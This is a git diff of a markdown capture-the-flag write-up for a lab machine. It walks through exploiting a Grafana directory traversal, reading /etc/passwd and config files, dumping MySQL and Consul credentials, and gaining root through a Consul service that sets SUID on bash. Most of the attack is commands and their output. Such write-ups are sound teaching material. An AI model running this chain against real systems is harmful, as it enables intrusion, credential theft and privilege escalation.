@@ -1,4 +1,4 @@
-### Enum
+## Enum
 ```
 22   - OpenSSH 8.2p1 (Ubuntu)
 80   - Apache 2.4.41 (Ubuntu)
@@ -6,7 +6,7 @@
 3306 - MySQL 8.0.30-0 ubuntu0.20.04.2
 ```
 the page on port 80 says devops will give you the password to developer. ok.
-```
+```bash
  dirsearch -u http://example.org                                                                                                                                                         130 ⨯
 
   _|. _ _  _  _  _ _|_    v0.4.2
@@ -60,7 +60,7 @@ Task Completed
 ## Grafana 8.0.0 -> 8.3.0 - Directory traversal
 
 we know that grafana is 8.2.0 and the Directory Traversal vulnerability bellow is from 8.0.0 to 8.3.0
-```
+```bash
 searchsploit grafana
 --------------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                             |  Path
@@ -71,7 +71,7 @@ Grafana 8.3.0 - Directory Traversal and Arbitrary File Read                | mul
 Shellcodes: No Results
 ```
 and it works indeed
-```
+```bash
 python3 grafana-traversal.py -H http://example.org:3000
 Read file > /etc/passwd
 root:x:0:0:root:/root:/bin/bash
@@ -114,18 +114,18 @@ consul:x:997:997::/home/consul:/bin/false
 
 Read file >
 ```
-```
+```bash
 grep sh$ passwd
 root:x:0:0:root:/root:/bin/bash
 developer:x:1000:1000:developer:/home/developer:/bin/bash
 ```
-```
+```bash
 grep graf passwd
 grafana:x:113:118::/usr/share/grafana:/bin/false
 ```
 
 looking at the documentation for grafana, we're pulling the default config location for an ubuntu install
-```
+```bash
 /etc/grafana/grafana.ini
 ```
 the only non default config is the admin password
@@ -136,7 +136,7 @@ admin_password = messageInABottle685427
 the portal shows that the config file for the datasource is "mysql.yaml"   
 again looking a little into the documentation, we're pulling the mysql datasource config file with the same exploit  
 and that gives us the  password for the grafana mysql database user  
-```
+```yaml
 Read file > /etc/grafana/provisioning/datasources/mysql.yaml
 apiVersion: 1
 
@@ -153,11 +153,11 @@ datasources:
 
 ## Connecting to the MySQL database
 as we know the db is exposed to over the network, so at this stage nothing prevents us from connecting directly  
-```
+```sql
 mysql -u grafana -p -h example.org -D grafana
 ```
 
-```
+```sql
 MySQL [whackywidget]> select * from users;
 +-----------+------------------------------------------+
 | user      | pass                                     |
@@ -165,24 +165,24 @@ MySQL [whackywidget]> select * from users;
 | developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== |
 +-----------+------------------------------------------+
 ```
-that's embarassing
-```
+the password isn't even hashed that's embarassing
+```bash
 printf 'YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg=='|base64 -d
 anEnglishManInNewYork027468
 ```
-```
+```bash
 developer@ambassador:~$ wc -c user.txt
 33 user.txt
 ```
 
 ## Privesc
-```
+```bash
 sudo -l
 [sudo] password for developer:
 Sorry, user developer may not run sudo on ambassador.
 ```
 the git config in the developer users's home points to /opt/my-app where the whacky app thing resides 
-```
+```bash
 cat .gitconfig
 [user]
         name = Developer
@@ -192,7 +192,7 @@ cat .gitconfig
 ```
 
 so we can look at the git logs in there 
-```
+```bash
  git log --oneline
 33a53ef (HEAD -> main) tidy config script
 c982db8 config script
@@ -200,7 +200,7 @@ c982db8 config script
 4b8597b .gitignore
 ```
 and get a token to talk to the consul API
-```
+```bash
 git show 33a53ef
 commit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -> main)
 Author: Developer <developer@ambassador.local>
@@ -222,13 +222,13 @@ index 35c08f6..fc51ec0 100755
 ```
 
 looks like this thing offers some kind of secret management: 
-```
+```bash
 consul kv get --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw
 dontStandSoCloseToMe63221!
 ```
 
 but there's nothing in there that we don't already know 
-```
+```json
 consul kv export --token bb03b43b-1d81-d62b-24b5-39540ee469b5
 [
         {
@@ -245,7 +245,7 @@ consul kv export --token bb03b43b-1d81-d62b-24b5-39540ee469b5
 ```
 
 there's also the Django secret key, I believe that might allow us to do some attacks on the cryptography django, not sure that's relevant right now.
-```
+```bash
 +# Quick-start development settings - unsuitable for production
 +# See https://docs.djangoproject.com/en/4.0/howto/deployment/checklist/
 +
@@ -258,7 +258,7 @@ there's also the Django secret key, I believe that might allow us to do some att
 I know very little about consul, but from what I started reading this is a mesh networking solution for microservice oriented architectures. So in theory this is used to connect various containers accross nodes and datacenters. I don't believe there's any kubernetes running here, but there's lxd. I'll need to poke around to understand what consul really offers and how it works.  
 
 ports that seem related to consul
-```
+```bash
 netstat -tulpen|grep 127.0.0.1:8|grep tcp
 tcp        0      0 127.0.0.1:8300          0.0.0.0:*               LISTEN      0          38103      -
 tcp        0      0 127.0.0.1:8301          0.0.0.0:*               LISTEN      0          38108      -
@@ -277,7 +277,7 @@ tcp        0      0 127.0.0.1:8600          0.0.0.0:*               LISTEN      
 
 so the commands bellow are just a dump of things I tried:
 
-```
+```bash
 CONSUL_HTTP_TOKEN=bb03b43b-1d81-d62b-24b5-39540ee469b5
 export CONSUL_HTTP_TOKEN 
 consul kv get whackywidget/db/mysql_pw
@@ -295,7 +295,7 @@ consul exec -node=ambassador 'ip a'   # Not working
 [https://www.consul.io/api-docs/api-structure](https://www.consul.io/api-docs/api-structure)   
 [https://www.consul.io/api-docs/agent/service#register-service](https://www.consul.io/api-docs/agent/service#register-service)   
 first I'll be forwarding the agent port to my local machine so I can use jq
-```
+```bash
 ssh -fNL 8500:localhost:8500 developer@example.org
 ```
 listing all existing services
@@ -381,7 +381,7 @@ curl -s \
 ```
 
 writing a bash script in /tmp that will make a suid bash 
-```
+```bash
 echo 'chmod +s /usr/bin/bash' > blnkn.sh
 cat blnkn.sh
 chmod +s /usr/bin/bash
@@ -446,7 +446,7 @@ curl -s \
 }
 ```
 yep
-```
+```bash
 consul catalog services
 blnkn
 consul
@@ -454,7 +454,7 @@ meow
 svc111
 ```
 and now bash is suid, so we can run it with preserve and it won't drop root permissions. 
-```
+```bash
 ls -la $(which bash)
 -rwsr-sr-x 1 root root 1183448 Apr 18 09:14 /usr/bin/bash
  bash -p
